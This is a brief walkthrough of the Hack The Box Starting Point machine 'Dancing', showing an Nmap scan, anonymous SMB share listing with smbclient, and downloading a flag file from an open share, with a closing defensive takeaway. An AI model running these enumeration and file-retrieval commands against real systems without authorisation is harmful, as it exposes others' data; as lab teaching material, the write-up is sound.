---
title: "Hack The Box: Dancing"
symbol: "Da"
category: "Machines"
readTime: 2
tldr: "Scanning SMB on port 445, listing network shares without passwords, and navigating remote file shares."
red: "Use smbclient to enumerate open shares without credentials, browse directories, and download sensitive files."
blue: "Enforce SMB authentication, require SMB packet signing, and audit share access permissions."
next: "idor"
---

### Machine Overview
Dancing is the third target in Hack The Box's Starting Point Tier 0. It introduces Server Message Block (SMB) file sharing on Windows and demonstrates how open shares leak sensitive information.

### Step 1: Port Scanning
An Nmap scan reveals standard Windows file-sharing ports:
```bash
nmap -sV <target_ip>
```
Output:
```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds  Windows Server 2019
```
Port 445 (Microsoft-DS) indicates active SMB file sharing.

### Step 2: Listing SMB Shares
We use `smbclient` with the `-L` (list) and `-N` (no password) flags to check for accessible shares:
```bash
smbclient -L //<target_ip> -N
```
The server returns four shares:
- `ADMIN$`: Administrative share (Access denied).
- `C$`: Default drive root (Access denied).
- `IPC$`: Inter-Process Communication.
- `WorkShares`: Custom user share.

### Step 3: Connecting to the Unauthenticated Share
We connect directly to `WorkShares` without a password:
```bash
smbclient //<target_ip>/WorkShares -N
```
We receive an interactive SMB prompt:
```
smb: \> ls
  .                                   D        0  Mon Mar 29 09:22:04 2021
  ..                                  D        0  Mon Mar 29 09:22:04 2021
  Amy.J                               D        0  Mon Mar 29 10:08:21 2021
  James.P                             D        0  Mon Mar 29 10:04:47 2021
```

We navigate into `James.P`:
```bash
smb: \> cd James.P
smb: \James.P\> ls
  flag.txt                            A       32  Mon Mar 29 10:26:57 2021
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt as flag.txt (32 bytes)
```

We exit the SMB client and read the downloaded flag:
```bash
cat flag.txt
```

### Key takeaway
Never allow anonymous or unauthenticated guest access to SMB shares. Enforce robust NTFS file permissions and require authenticated domain credentials for every share access.
